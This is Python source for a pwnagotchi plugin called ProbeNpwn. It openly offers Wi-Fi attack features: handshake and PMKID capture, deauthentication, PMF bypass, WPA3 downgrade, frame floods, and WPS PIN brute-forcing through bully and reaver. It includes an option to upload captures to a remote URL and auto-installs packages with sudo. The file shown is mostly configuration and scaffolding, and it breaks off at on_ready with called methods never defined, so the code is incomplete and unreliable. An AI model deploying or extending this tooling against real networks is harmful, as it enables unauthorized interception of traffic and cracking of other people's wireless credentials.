"""
ProbeNpwn v3.3.0 – Ultimate handshake/PMKID capture plugin
Author: AlienMajik
License: GPL3

New in 3.3.0:
- Added quiet association attacks: PMKID association, auth frame harvest,
  reassociation PMKID, RSN probe, CSA probe (no deauth needed).
- WPS attack now captures PIN from bully/reaver and saves to /root/handshakespin/.
- New config options: enable_pmkid_attack, enable_auth_harvest,
  enable_reassociation, enable_rsn_probe, pin_save_path.
- Improved process handling for external tools with output parsing.
- Now respects pwnagotchi personality settings for deauth and associate.
"""

import logging
import time
import threading
import os
import subprocess
import random
import json
import math
import struct
import base64
import re
import binascii
from collections import OrderedDict, defaultdict, deque
from concurrent.futures import ThreadPoolExecutor, Future
import heapq
import multiprocessing
from logging.handlers import RotatingFileHandler
from typing import Optional, List, Dict, Any, Tuple, Set
import queue

# Optional imports
try:
    import psutil
except ImportError:
    psutil = None

try:
    import requests
except ImportError:
    requests = None

import pwnagotchi.plugins as plugins
import pwnagotchi.ui.components as components

# Scapy for packet injection
try:
    from scapy.all import RadioTap, Dot11, Dot11QoS, LLC, SNAP, EAPOL, sendp, Raw, Dot11Deauth, Dot11ProbeReq
    from scapy.all import Dot11AssoReq, Dot11Elt, Dot11EltRSN, fragment, Dot11Auth, Dot11ReassoReq, Dot11Disas
    from scapy.all import Dot11Beacon, Dot11ProbeResp, Dot11ATIM, Dot11Action
    from scapy.all import conf, sniff
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# ----------------------------------------------------------------------
# Constants
# ----------------------------------------------------------------------
DEFAULT_BLACKLIST_PATH = "/root/handshakes/probenpwn_blacklist.json"
DEFAULT_LOG_PATH = "/root/handshakes/probenpwn_captures.jsonl"
DEFAULT_STATE_PATH = "/root/handshakes/probenpwn_state.json"
DEFAULT_PIN_SAVE_PATH = "/root/handshakespin/"
LOG_MAX_BYTES = 10 * 1024 * 1024  # 10 MB
LOG_BACKUP_COUNT = 3

MAX_RECENTS = 1000
MAX_SCORES = 2000
MAX_AP_CLIENTS = 1000
MAX_AP_GROUPS = 1000
MAX_CLIENTS_PER_AP = 100
MAX_HANDSHAKE_DB = 5000
MAX_DELAY_CACHE = 500
MAX_ATTEMPT_HISTORY = 2000
MAX_RETRY_QUEUE = 300
GPS_HISTORY_MAX_AGE = 300

RECENT_TTL = 60
SCORE_DECAY_FACTOR = 0.99
CHANNEL_SUCCESS_DECAY = 0.995
ATTEMPT_DECAY_FACTOR = 0.98
STATE_SAVE_INTERVAL = 300

RATE_LIMIT_TOKENS_PER_AP = 5
RATE_LIMIT_REFILL_RATE = 0.5
RATE_LIMIT_MAX_TOKENS = 10

# Maximum concurrent external processes (WPS attacks, etc.)
MAX_CONCURRENT_EXTERNAL = 3

WPA3_AKMS = {8, 24}  # SAE
FT_AKMS = {2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25}
ENTERPRISE_AKMS = {1, 3, 5, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25}

TIME_PERIODS = {
    'night': (0, 5),
    'morning': (6, 11),
    'afternoon': (12, 17),
    'evening': (18, 23)
}

# Regex for PIN extraction from bully/reaver output
REAVER_PIN_REGEX = re.compile(r"WPS PIN:\s*'?(\d{8})'?")
BULLY_PIN_REGEX = re.compile(r"\[P\]\s*PIN\s*=\s*(\d{8})")

# ----------------------------------------------------------------------
# Helper classes
# ----------------------------------------------------------------------
class TTLCache:
    """Thread‑safe TTL cache with max size, using OrderedDict."""
    def __init__(self, maxsize: int, ttl: float):
        self.maxsize = maxsize
        self.ttl = ttl
        self.cache = OrderedDict()
        self.timestamps = OrderedDict()
        self.lock = threading.Lock()

    def __contains__(self, key):
        with self.lock:
            return key in self.cache and (time.time() - self.timestamps[key] < self.ttl)

    def get(self, key, default=None):
        with self.lock:
            if key in self.cache and (time.time() - self.timestamps[key] < self.ttl):
                self.cache.move_to_end(key)
                self.timestamps.move_to_end(key)
                return self.cache[key]
            return default

    def put(self, key, value):
        with self.lock:
            now = time.time()
            if key in self.cache:
                self.cache[key] = value
                self.timestamps[key] = now
                self.cache.move_to_end(key)
                self.timestamps.move_to_end(key)
            else:
                if len(self.cache) >= self.maxsize:
                    self.cache.popitem(last=False)
                    self.timestamps.popitem(last=False)
                self.cache[key] = value
                self.timestamps[key] = now

    def remove(self, key):
        with self.lock:
            if key in self.cache:
                del self.cache[key]
                del self.timestamps[key]

    def cleanup(self):
        with self.lock:
            now = time.time()
            expired = [k for k, t in self.timestamps.items() if now - t >= self.ttl]
            for k in expired:
                del self.cache[k]
                del self.timestamps[k]

    def items(self):
        with self.lock:
            return list(self.cache.items())


class TokenBucket:
    """Token bucket rate limiter."""
    def __init__(self, rate: float, capacity: float, initial: float = None):
        self.rate = rate
        self.capacity = capacity
        self.tokens = initial if initial is not None else capacity
        self.last_refill = time.time()
        self.lock = threading.Lock()

    def consume(self, tokens: float = 1.0) -> bool:
        with self.lock:
            self._refill()
            if self.tokens >= tokens:
                self.tokens -= tokens
                return True
            return False

    def _refill(self):
        now = time.time()
        elapsed = now - self.last_refill
        self.tokens = min(self.capacity, self.tokens + elapsed * self.rate)
        self.last_refill = now


class AdaptiveTokenBucket(TokenBucket):
    """Token bucket that adjusts rate based on success ratio."""
    def __init__(self, rate: float, capacity: float, initial: float = None):
        super().__init__(rate, capacity, initial)
        self.base_rate = rate
        self.success_ratio = 0.5  # start neutral
        self.attempts = 0
        self.successes = 0

    def update_stats(self, success: bool):
        self.attempts += 1
        if success:
            self.successes += 1
        if self.attempts >= 10:
            self.success_ratio = self.successes / self.attempts
            # Adjust rate: more success → more tokens
            self.rate = self.base_rate * (0.5 + self.success_ratio)
            self.attempts = 0
            self.successes = 0


# ----------------------------------------------------------------------
# Main Plugin Class
# ----------------------------------------------------------------------
class ProbeNpwn(plugins.Plugin):
    __author__ = 'AlienMajik'
    __version__ = '3.3.0'
    __license__ = 'GPL3'
    __description__ = 'Ultimate handshake/PMKID capture – with quiet association attacks and WPS PIN saving.'

    def __init__(self):
        super().__init__()
        self.logger = logging.getLogger(__name__)
        self.logger.debug("ProbeNpwn v3.3.0 initializing")

        self.config = {}
        self.agent = None

        # UI Toggles
        self.show_attacks = True
        self.show_success = True
        self.show_handshakes = True
        self.show_mode = True
        self.show_top_channels = True
        self.show_pmf_status = True
        self.show_success_bar = True
        self.show_pnp_status = True
        self.show_attack_rate = True
        self.show_top_targets = True
        self.show_gps_indicator = True
        self.show_eta = True
        self.show_pmf_method = False
        self.show_ext_procs = False
        self.show_battery = False

        # Data structures
        self.recents = TTLCache(MAX_RECENTS, RECENT_TTL)
        self.handshake_db = OrderedDict()
        self.handshake_lock = threading.Lock()
        self.delay_cache = TTLCache(MAX_DELAY_CACHE, 60)

        self.attack_attempts = defaultdict(int)
        self.success_counts = defaultdict(int)
        self.assoc_fails = defaultdict(int)
        self.last_success_time = defaultdict(float)

        self.client_scores = OrderedDict()
        self.ap_client_groups = OrderedDict()
        self.channel_visits = defaultdict(int)
        self.total_channel_visits = 0
        self.channel_success = defaultdict(float)
        self.channel_activity = defaultdict(lambda: {"aps": 0, "clients": 0})
        self.channel_time_pattern = defaultdict(lambda: defaultdict(int))

        self.whitelist: Set[str] = set()
        self.blacklist = TTLCache(MAX_AP_GROUPS, 3600)
        self.cooldowns = TTLCache(MAX_AP_GROUPS, 3600)

        self.retry_queue = []
        self.retry_queue_lock = threading.Lock()

        self.rate_limiters: Dict[str, AdaptiveTokenBucket] = {}
        self.rate_limiter_lock = threading.Lock()

        # Capability storage with locks
        self.ap_capabilities: Dict[str, dict] = {}
        self.client_capabilities: Dict[str, dict] = {}
        self.ap_cap_lock = threading.Lock()
        self.client_cap_lock = threading.Lock()

        # Threading
        self.executor: Optional[ThreadPoolExecutor] = None
        self.executor_lock = threading.Lock()
        self._watchdog_thread: Optional[threading.Thread] = None
        self._watchdog_running = True
        self._sniffer_thread: Optional[threading.Thread] = None
        self._sniffer_running = False
        self._client_cap_sniffer_thread: Optional[threading.Thread] = None
        self._client_cap_sniffer_running = False

        # External process tracking
        self.external_processes: List[subprocess.Popen] = []
        self.external_processes_lock = threading.Lock()
        self.external_semaphore = threading.Semaphore(MAX_CONCURRENT_EXTERNAL)

        # Mode & Scaling
        self.mode = "tactical"
        self.effective_mode = "tactical"
        self.mobility_score = 0.0
        self.new_aps_per_epoch = 0
        self.epoch_count = 0
        self.env_check_interval = 10

        self.scaling_bounds = {
            'recon_time': (2, 30),
            'ap_ttl': (30, 300),
            'sta_ttl': (30, 300),
            'deauth_prob': (0.9, 1.0),
            'assoc_prob': (0.9, 1.0),
            'min_rssi': (-85, -60),
            'throttle_a': (0.1, 0.2),
            'throttle_d': (0.1, 0.2),
        }

        # Channels
        self.enable_5ghz = False
        self.enable_6ghz = False
        self.possible_channels = list(range(1, 14))
        self.five_ghz_channels = [36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,144,149,153,157,161,165]
        self.six_ghz_channels = list(range(1, 234, 4))

        # PMF Bypass Methods
        self.pmf_bypass_methods: List[str] = []
        self.current_pmf_method: Optional[str] = None

        self.scapy_available = SCAPY_AVAILABLE
        self.scapy_available_lock = threading.Lock()
        self.monitor_iface = "wlan0mon"
        self.inject_iface = None

        # External Tools
        self.use_external_tools = False
        self.external_tools = {
            'aireplay': self._check_tool('aireplay-ng'),
            'mdk4': self._check_tool('mdk4'),
            'hcxdumptool': self._check_tool('hcxdumptool'),
            'bully': self._check_tool('bully'),
            'reaver': self._check_tool('reaver'),
        }

        # MAC Randomization
        self.mac_randomization = False
        self.mac_pool: List[str] = []
        self.mac_pool_lock = threading.Lock()

        # Stealth / Backoff
        self.exp_backoff_base = 2

        # State persistence
        self.state_path = DEFAULT_STATE_PATH
        self.last_state_save = 0

        # Power / resource management
        self.low_battery_threshold = 15
        self.high_cpu_threshold = 80
        self.paused = False

        # Dry run
        self.dry_run = False

        # GPS history
        self.gps_history = deque(maxlen=10)

        # Logging
        self.log_path = DEFAULT_LOG_PATH
        self.log_max_bytes = LOG_MAX_BYTES
        self.log_backup_count = LOG_BACKUP_COUNT
        self.json_logger: Optional[logging.Logger] = None

        # Upload
        self.upload_url: Optional[str] = None
        self.upload_interval = 3600
        self.upload_queue: queue.Queue = queue.Queue(maxsize=100)  # bounded queue
        self.upload_thread: Optional[threading.Thread] = None
        self.upload_running = False

        # New attack toggles (quiet association)
        self.enable_pmkid_attack = False
        self.enable_auth_harvest = False
        self.enable_reassociation = False
        self.enable_rsn_probe = False

        # PIN save path
        self.pin_save_path = DEFAULT_PIN_SAVE_PATH

        # UI elements
        self.ui_initialized = False
        self.last_ui_update = 0
        self.ui_update_interval = 5
        self.ui_positions = {
            'attacks': (10, 20),
            'success': (10, 30),
            'handshakes': (10, 40),
            'pnp_status': (10, 90),
            'mode': (10, 50),
            'top_channels': (10, 60),
            'pmf_status': (10, 70),
            'success_bar': (10, 80),
            'attack_rate': (120, 20),
            'top_targets': (120, 30),
            'gps_indicator': (120, 40),
            'eta': (120, 50),
            'pmf_method': (120, 60),
            'ext_procs': (120, 70),
            'battery': (120, 80),
        }

        # Performance metrics for UI
        self.attack_count_epoch = 0
        self.last_attack_count_reset = time.time()
        self.attack_rate_value = 0.0
        self.top_targets_list = []
        self.gps_locked = False
        self.eta_seconds: Optional[float] = None

    # ------------------------------------------------------------------
    # Helper: check if external tool exists
    # ------------------------------------------------------------------
    def _check_tool(self, name: str) -> bool:
        try:
            subprocess.run([name, '--version'], capture_output=True, timeout=5)
            return True
        except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
            return False

    # ------------------------------------------------------------------
    # Helper: get personality settings from agent
    # ------------------------------------------------------------------
    def _get_personality_setting(self, agent, key: str, default: bool = True) -> bool:
        """Safely retrieve a boolean personality setting from the agent's config."""
        if agent is None:
            return default
        try:
            return agent._config.get('personality', {}).get(key, default)
        except AttributeError:
            return default

    # ------------------------------------------------------------------
    # MAC randomization helpers (locally administered)
    # ------------------------------------------------------------------
    def _generate_locally_administered_mac(self) -> str:
        """Generate a random locally administered unicast MAC address."""
        first_byte = random.randint(0x02, 0xfe) | 0x02
        mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
        return ':'.join(f"{b:02x}" for b in mac).lower()

    def _generate_mac_pool(self, size: int = 100):
        with self.mac_pool_lock:
            self.mac_pool = [self._generate_locally_administered_mac() for _ in range(size)]

    def _get_random_mac(self) -> str:
        with self.mac_pool_lock:
            if not self.mac_pool:
                self._generate_mac_pool(100)
            mac = self.mac_pool.pop(0)
            self.mac_pool.append(self._generate_locally_administered_mac())
            return mac

    # ------------------------------------------------------------------
    # Time‑of‑day period
    # ------------------------------------------------------------------
    def _get_time_period(self) -> str:
        hour = time.localtime().tm_hour
        for period, (start, end) in TIME_PERIODS.items():
            if start <= hour <= end:
                return period
        return 'night'

    # ------------------------------------------------------------------
    # State persistence (with timestamps) – improved error handling
    # ------------------------------------------------------------------
    def _save_state(self):
        if not self.state_path:
            return
        try:
            with self.handshake_lock:
                handshake_dict = {f"{ap}_{cl}": ts for (ap, cl), ts in self.handshake_db.items()}
            state = {
                'handshake_db': handshake_dict,
                'blacklist': dict(self.blacklist.items()),
                'client_scores': dict(self.client_scores),
                'channel_success': dict(self.channel_success),
                'channel_visits': dict(self.channel_visits),
                'total_channel_visits': self.total_channel_visits,
                'channel_time_pattern': {str(h): dict(ch) for h, ch in self.channel_time_pattern.items()},
                'last_success_time': dict(self.last_success_time),
            }
            # Write to temporary file then rename for atomicity
            tmp_path = self.state_path + ".tmp"
            with open(tmp_path, 'w') as f:
                json.dump(state, f)
            os.replace(tmp_path, self.state_path)
            self.logger.debug("State saved")
        except (OSError, IOError, json.JSONEncodeError) as e:
            self.logger.error(f"Failed to save state: {e}", exc_info=True)

    def _load_state(self):
        if not os.path.exists(self.state_path):
            return
        try:
            with open(self.state_path, 'r') as f:
                state = json.load(f)
        except (json.JSONDecodeError, OSError, IOError) as e:
            self.logger.error(f"Failed to load state from {self.state_path}: {e}", exc_info=True)
            # Attempt to load from backup if exists
            backup_path = self.state_path + ".bak"
            if os.path.exists(backup_path):
                try:
                    with open(backup_path, 'r') as f:
                        state = json.load(f)
                    self.logger.info("Loaded state from backup")
                except Exception as backup_e:
                    self.logger.error(f"Backup load also failed: {backup_e}")
                    state = {}
            else:
                state = {}
        else:
            # Create a backup of the successfully loaded file
            try:
                backup_path = self.state_path + ".bak"
                with open(self.state_path, 'r') as src, open(backup_path, 'w') as dst:
                    dst.write(src.read())
            except Exception as backup_e:
                self.logger.warning(f"Could not create state backup: {backup_e}")

        with self.handshake_lock:
            handshake_dict = state.get('handshake_db', {})
            self.handshake_db = OrderedDict()
            for key, ts in handshake_dict.items():
                try:
                    ap, cl = key.split('_', 1)
                    self.handshake_db[(ap, cl)] = ts
                except ValueError:
                    continue
        for mac, expiry in state.get('blacklist', {}).items():
            self.blacklist.put(mac, expiry)
        self.client_scores = OrderedDict(state.get('client_scores', {}))
        self.channel_success = defaultdict(float, state.get('channel_success', {}))
        self.channel_visits = defaultdict(int, state.get('channel_visits', {}))
        self.total_channel_visits = state.get('total_channel_visits', 0)
        for h, ch_dict in state.get('channel_time_pattern', {}).items():
            try:
                key = int(h)
            except ValueError:
                key = h
            self.channel_time_pattern[key] = defaultdict(int, ch_dict)
        self.last_success_time = defaultdict(float, state.get('last_success_time', {}))
        self.logger.info(f"State loaded from {self.state_path}")

    # ------------------------------------------------------------------
    # Power & resource check
    # ------------------------------------------------------------------
    def _check_system_load(self) -> bool:
        if psutil is None:
            return True
        try:
            if hasattr(psutil, 'sensors_battery'):
                batt = psutil.sensors_battery()
                if batt and batt.percent < self.low_battery_threshold and not batt.power_plugged:
                    self.logger.info(f"Low battery ({batt.percent}%) – pausing attacks")
                    return False
            cpu_percent = psutil.cpu_percent(interval=0.5)
            if cpu_percent > self.high_cpu_threshold:
                self.logger.info(f"High CPU ({cpu_percent}%) – pausing attacks")
                return False
        except Exception as e:
            self.logger.warning(f"System load check failed: {e}")
        return True

    # ------------------------------------------------------------------
    # Packet decoding helper
    # ------------------------------------------------------------------
    def _decode_packet(self, packet_data):
        if isinstance(packet_data, str):
            try:
                return base64.b64decode(packet_data)
            except (binascii.Error, TypeError):
                return packet_data.encode()
        elif isinstance(packet_data, bytes):
            return packet_data
        else:
            return None

    # ------------------------------------------------------------------
    # Capability parsing (with locks)
    # ------------------------------------------------------------------
    def _parse_ap_capabilities(self, ap: dict):
        mac = ap['mac'].lower()
        caps = {}
        caps['wps'] = False
        caps['wpa3'] = self.is_wpa3(ap)
        caps['ft'] = self.is_ft(ap)
        caps['enterprise'] = self.is_enterprise(ap)
        caps['pmf'] = self.is_pmf_protected(ap)
        caps['tdls'] = False
        caps['mesh'] = False

        if 'packet' in ap and self.scapy_available:
            raw_pkt = self._decode_packet(ap['packet'])
            if raw_pkt:
                try:
                    pkt = RadioTap(raw_pkt)
                    elt = pkt.getlayer(Dot11Elt)
                    while elt:
                        if elt.ID == 221 and len(elt.info) >= 4:
                            oui = elt.info[:3]
                            if oui == b'\x00\x50\xf2' and elt.info[3] == 4:
                                caps['wps'] = True
                        if elt.ID == 127:
                            if len(elt.info) > 0 and (elt.info[0] & 0x20):
                                caps['tdls'] = True
                        elt = elt.payload.getlayer(Dot11Elt) if hasattr(elt.payload, 'getlayer') else None
                except Exception as e:
                    self.logger.debug(f"Failed to parse AP packet for {mac}: {e}")

        with self.ap_cap_lock:
            self.ap_capabilities[mac] = caps
        ap.update(caps)

    def _parse_client_capabilities(self, cl: dict, packet=None) -> dict:
        mac = cl['mac'].lower()
        caps = {}
        if not packet or not self.scapy_available:
            with self.client_cap_lock:
                return self.client_capabilities.get(mac, {})
        raw_pkt = self._decode_packet(packet)
        if raw_pkt:
            try:
                pkt = RadioTap(raw_pkt)
                elt = pkt.getlayer(Dot11Elt)
                while elt:
                    if elt.ID == 127:
                        if len(elt.info) > 0 and (elt.info[0] & 0x20):
                            caps['tdls'] = True
                    elt = elt.payload.getlayer(Dot11Elt) if hasattr(elt.payload, 'getlayer') else None
            except Exception as e:
                self.logger.debug(f"Failed to parse client packet for {mac}: {e}")
        with self.client_cap_lock:
            self.client_capabilities[mac] = caps
        return caps

    # ------------------------------------------------------------------
    # Detection methods
    # ------------------------------------------------------------------
    def is_enterprise(self, ap: dict) -> bool:
        rsn = ap.get('rsn', {})
        akms = rsn.get('akms', [])
        return any(akm in ENTERPRISE_AKMS for akm in akms)

    def is_wpa3(self, ap: dict) -> bool:
        rsn = ap.get('rsn', {})
        akms = rsn.get('akms', [])
        return any(akm in WPA3_AKMS for akm in akms)

    def is_ft(self, ap: dict) -> bool:
        rsn = ap.get('rsn', {})
        akms = rsn.get('akms', [])
        return any(akm in FT_AKMS for akm in akms)

    def is_pmf_protected(self, ap: dict) -> bool:
        return ap.get('mfpr', False) or ap.get('pmf', False)

    # ------------------------------------------------------------------
    # Disable Scapy-dependent attacks if Scapy missing
    # ------------------------------------------------------------------
    def _disable_scapy_attacks(self):
        if not self.scapy_available:
            self.logger.warning("Scapy not available – disabling all Scapy‑dependent attacks")
            self.enable_pmkid_attack = False
            self.enable_auth_harvest = False
            self.enable_reassociation = False
            self.enable_rsn_probe = False
            self.enable_wpa3_downgrade = False
            self.enable_ft_handshake = False
            self.enable_tdls = False
            self.enable_mesh = False
            self.enable_eapol_start = False
            self.enable_eapol_logoff = False
            self.enable_disassociation = False
            self.enable_null_data = False
            self.enable_csa = False
            self.enable_beacon_flood = False
            self.enable_probe_response_flood = False
            self.enable_auth_flood = False
            self.enable_assoc_flood = False
            self.enable_ps_poll = False
            self.enable_cf_end = False
            self.enable_mimo = False
            self.pmf_bypass_methods = []
            self.logger.info("Scapy‑dependent attacks disabled")

    # ------------------------------------------------------------------
    # on_loaded
    # ------------------------------------------------------------------
    def on_loaded(self):
        self.logger.info("ProbeNpwn v3.3.0 loaded")
        os.makedirs(os.path.dirname(DEFAULT_BLACKLIST_PATH), exist_ok=True)
        os.makedirs(os.path.dirname(DEFAULT_LOG_PATH), exist_ok=True)
        os.makedirs(os.path.dirname(DEFAULT_STATE_PATH), exist_ok=True)
        os.makedirs(self.pin_save_path, exist_ok=True)

        self._load_blacklist()
        self._load_state()

        self._setup_json_logger()

        if not self.scapy_available and self.config.get('auto_install_scapy', True):
            self._attempt_scapy_install()

        # After potential install, re-check Scapy and disable attacks if still missing
        self._disable_scapy_attacks()

        self._watchdog_running = True
        self._watchdog_thread = threading.Thread(target=self._watchdog, daemon=True)
        self._watchdog_thread.start()

        if self.config.get('enable_sae_capture', False) and self.scapy_available:
            self._sniffer_running = True
            self._sniffer_thread = threading.Thread(target=self._sniffer_loop, daemon=True)
            self._sniffer_thread.start()

        if self.scapy_available:
            self._client_cap_sniffer_running = True
            self._client_cap_sniffer_thread = threading.Thread(target=self._client_cap_sniffer, daemon=True)
            self._client_cap_sniffer_thread.start()

        if self.upload_url:
            self._start_uploader()

    def _setup_json_logger(self):
        self.json_logger = logging.getLogger('probenpwn_json')
        self.json_logger.setLevel(logging.INFO)
        for h in self.json_logger.handlers[:]:
            self.json_logger.removeHandler(h)
        handler = RotatingFileHandler(self.log_path, maxBytes=self.log_max_bytes,
                                      backupCount=self.log_backup_count)
        handler.setFormatter(logging.Formatter('%(message)s'))
        self.json_logger.addHandler(handler)
        self.json_logger.propagate = False

    def _load_blacklist(self):
        blacklist_path = self.config.get('blacklist_path', DEFAULT_BLACKLIST_PATH)
        if os.path.exists(blacklist_path):
            try:
                with open(blacklist_path, 'r') as f:
                    data = json.load(f)
                    now = time.time()
                    for mac, expiry in data.items():
                        if expiry > now:
                            self.blacklist.put(mac, expiry)
                self.logger.info(f"Loaded {len(self.blacklist.cache)} active blacklist entries")
            except (json.JSONDecodeError, OSError, IOError) as e:
                self.logger.error(f"Blacklist load failed: {e}", exc_info=True)

    def _save_blacklist(self):
        blacklist_path = self.config.get('blacklist_path', DEFAULT_BLACKLIST_PATH)
        try:
            now = time.time()
            data = {mac: expiry for mac, expiry in self.blacklist.items() if expiry > now}
            with open(blacklist_path, 'w') as f:
                json.dump(data, f)
        except (OSError, IOError, json.JSONEncodeError) as e:
            self.logger.error(f"Blacklist save failed: {e}", exc_info=True)

    def _attempt_scapy_install(self):
        if not self.config.get('auto_install_scapy', True):
            return
        self.logger.warning("Scapy missing – attempting install...")
        try:
            # Check for apt
            subprocess.run(["which", "apt"], check=True, capture_output=True, timeout=10)
            subprocess.run(["sudo", "apt", "update"], timeout=60, check=False)
            res = subprocess.run(["sudo", "apt", "install", "-y", "python3-scapy"], timeout=300, capture_output=True)
            if res.returncode == 0:
                self.logger.info("Scapy installed via apt")
            else:
                # Fallback to pip
                res = subprocess.run(["pip3", "install", "--user", "scapy"], timeout=180, capture_output=True)
                if res.returncode == 0:
                    self.logger.info("Scapy installed via pip")
                else:
                    self.logger.error("Scapy install failed")
                    return
            # Test import
            test_code = "from scapy.all import RadioTap; print('ok')"
            res = subprocess.run(["python3", "-c", test_code], capture_output=True, timeout=10)
            if b'ok' in res.stdout:
                with self.scapy_available_lock:
                    self.scapy_available = True
                self.logger.info("Scapy now available after install")
            else:
                self.logger.error("Scapy import test failed")
        except (subprocess.TimeoutExpired, subprocess.CalledProcessError, OSError) as e:
            self.logger.error(f"Scapy install error: {e}", exc_info=True)

    # ------------------------------------------------------------------
    # on_config_changed
    # ------------------------------------------------------------------
    def on_config_changed(self, config):
        self.whitelist = {m.lower() for m in config["main"].get("whitelist", [])}
        cfg = config["main"]["plugins"].get("probenpwn", {})

        self.verbose = cfg.get("verbose", False)
        logging.getLogger().setLevel(logging.DEBUG if self.verbose else logging.INFO)

        self.mode = cfg.get("mode", "tactical").lower()
        self.effective_mode = "tactical" if self.mode == "adaptive" else self.mode

        self.show_attacks = cfg.get("show_attacks", True)
        self.show_success = cfg.get("show_success", True)
        self.show_handshakes = cfg.get("show_handshakes", True)
        self.show_mode = cfg.get("show_mode", True)
        self.show_top_channels = cfg.get("show_top_channels", True)
        self.show_pmf_status = cfg.get("show_pmf_status", True)
        self.show_success_bar = cfg.get("show_success_bar", True)
        self.show_pnp_status = cfg.get("show_pnp_status", True)
        self.show_attack_rate = cfg.get("show_attack_rate", True)
        self.show_top_targets = cfg.get("show_top_targets", True)
        self.show_gps_indicator = cfg.get("show_gps_indicator", True)
        self.show_eta = cfg.get("show_eta", True)
        self.show_pmf_method = cfg.get("show_pmf_method", False)
        self.show_ext_procs = cfg.get("show_ext_procs", False)
        self.show_battery = cfg.get("show_battery", False)

        for key in self.ui_positions:
            x = cfg.get(f"{key}_x_coord", self.ui_positions[key][0])
            y = cfg.get(f"{key}_y_coord", self.ui_positions[key][1])
            self.ui_positions[key] = (x, y)

        self.enable_5ghz = cfg.get("enable_5ghz", False)
        self.enable_6ghz = cfg.get("enable_6ghz", False)
        self.max_retries = cfg.get("max_retries", 3)
        self.env_check_interval = cfg.get("env_check_interval", 10)

        methods = cfg.get("pmf_bypass_methods", [])
        if isinstance(methods, str):
            methods = [m.strip() for m in methods.split(',')]
        self.pmf_bypass_methods = [m for m in methods if m in ['bad_msg', 'assoc_sleep', 'rsn_corrupt', 'frag']]

        self.monitor_iface = cfg.get("monitor_iface", "wlan0mon")
        self.inject_iface = cfg.get("inject_iface", self.monitor_iface)

        self.mac_randomization = cfg.get("mac_randomization", False)

        self.use_external_tools = cfg.get("use_external_tools", False)
        self.external_tools['mdk4'] = self._check_tool('mdk4') and cfg.get("enable_mdk4", False)
        self.external_tools['hcxdumptool'] = self._check_tool('hcxdumptool') and cfg.get("enable_hcxdumptool", False)
        self.external_tools['bully'] = self._check_tool('bully') and cfg.get("enable_wps_attacks", False)
        self.external_tools['reaver'] = self._check_tool('reaver') and cfg.get("enable_wps_attacks", False)

        self.dry_run = cfg.get("dry_run", False)
        self.low_battery_threshold = cfg.get("low_battery_threshold", 15)
        self.high_cpu_threshold = cfg.get("high_cpu_threshold", 80)
        self.upload_url = cfg.get("upload_url", None)
        self.upload_interval = cfg.get("upload_interval", 3600)
        self.auto_install_scapy = cfg.get("auto_install_scapy", True)

        self.enable_wpa3_downgrade = cfg.get("enable_wpa3_downgrade", True)
        self.enable_ft_handshake = cfg.get("enable_ft_handshake", True)
        self.enable_sae_capture = cfg.get("enable_sae_capture", False)
        self.enable_tdls = cfg.get("enable_tdls", False)
        self.enable_mesh = cfg.get("enable_mesh", False)
        self.enable_wps = cfg.get("enable_wps", False)
        self.enable_eapol_start = cfg.get("enable_eapol_start", True)
        self.enable_eapol_logoff = cfg.get("enable_eapol_logoff", True)
        self.enable_disassociation = cfg.get("enable_disassociation", True)
        self.enable_null_data = cfg.get("enable_null_data", True)
        self.enable_csa = cfg.get("enable_csa", False)
        self.enable_beacon_flood = cfg.get("enable_beacon_flood", False)
        self.enable_probe_response_flood = cfg.get("enable_probe_response_flood", False)
        self.enable_auth_flood = cfg.get("enable_auth_flood", False)
        self.enable_assoc_flood = cfg.get("enable_assoc_flood", False)
        self.enable_ps_poll = cfg.get("enable_ps_poll", True)
        self.enable_cf_end = cfg.get("enable_cf_end", False)
        self.enable_mimo = cfg.get("enable_mimo", False)

        # New quiet association attacks
        self.enable_pmkid_attack = cfg.get("enable_pmkid_attack", False)
        self.enable_auth_harvest = cfg.get("enable_auth_harvest", False)
        self.enable_reassociation = cfg.get("enable_reassociation", False)
        self.enable_rsn_probe = cfg.get("enable_rsn_probe", False)

        # PIN save path
        self.pin_save_path = cfg.get("pin_save_path", DEFAULT_PIN_SAVE_PATH)
        os.makedirs(self.pin_save_path, exist_ok=True)

        for k, (lo, hi) in self.scaling_bounds.items():
            self.scaling_bounds[k] = (
                cfg.get(f"min_{k}", lo),
                cfg.get(f"max_{k}", hi)
            )

        self.possible_channels = list(range(1, 14))
        if self.enable_5ghz:
            self.possible_channels += self.five_ghz_channels
        if self.enable_6ghz:
            self.possible_channels += self.six_ghz_channels
        self.possible_channels = list(set(self.possible_channels))

        self.log_path = cfg.get("log_path", DEFAULT_LOG_PATH)
        self.log_max_bytes = cfg.get("log_max_bytes", LOG_MAX_BYTES)
        self.log_backup_count = cfg.get("log_backup_count", LOG_BACKUP_COUNT)
        self.state_path = cfg.get("state_path", DEFAULT_STATE_PATH)

        blacklist_path = cfg.get("blacklist_path", DEFAULT_BLACKLIST_PATH)
        if blacklist_path != DEFAULT_BLACKLIST_PATH:
            self.config['blacklist_path'] = blacklist_path

        self.rate_limit_refill_rate = cfg.get("rate_limit_refill_rate", RATE_LIMIT_REFILL_RATE)
        self.rate_limit_max_tokens = cfg.get("rate_limit_max_tokens", RATE_LIMIT_MAX_TOKENS)

        self._setup_json_logger()
        self._validate_config()
        # Disable Scapy attacks if Scapy missing (after config load)
        self._disable_scapy_attacks()

    def _validate_config(self):
        for param, (lo, hi) in self.scaling_bounds.items():
            if lo > hi:
                self.logger.warning(f"Invalid scaling bounds for {param}: {lo} > {hi}, swapping")
                self.scaling_bounds[param] = (hi, lo)
        self.possible_channels = [c for c in self.possible_channels if isinstance(c, int) and c > 0]
        if self.use_external_tools:
            for tool, available in self.external_tools.items():
                if not available and getattr(self, f"enable_{tool}", True):
                    self.logger.warning(f"External tool {tool} is not available but enabled in config")
        if not os.path.exists(f"/sys/class/net/{self.monitor_iface}"):
            self.logger.warning(f"Monitor interface {self.monitor_iface} does not exist")
        if self.inject_iface != self.monitor_iface and not os.path.exists(f"/sys/class/net/{self.inject_iface}"):
            self.logger.warning(f"Inject interface {self.inject_iface} does not exist, falling back to monitor")
            self.inject_iface = self.monitor_iface

    # ------------------------------------------------------------------
    # on_ready
    # ------------------------------------------------------------------
    def on_ready(self, agent):
        self.agent = agent
